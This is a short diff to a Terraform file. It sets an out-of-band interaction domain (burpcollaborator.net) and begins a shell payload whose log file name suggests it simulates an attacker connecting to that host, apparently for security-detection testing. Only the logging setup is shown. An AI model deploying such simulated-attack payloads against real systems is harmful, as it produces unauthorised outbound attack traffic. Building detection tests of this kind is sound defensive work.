@@ -1,7 +1,7 @@
 locals {
     oast_domain = "burpcollaborator.net"
     payload = <<-EOT
-    LOGFILE=/tmp/osconfig_attacker_connect_oast_host.log
+    LOGFILE=/tmp/${var.tag}.log
     function log {
         echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1"
         echo `date -u +"%Y-%m-%dT%H:%M:%SZ"`" $1" >> $LOGFILE
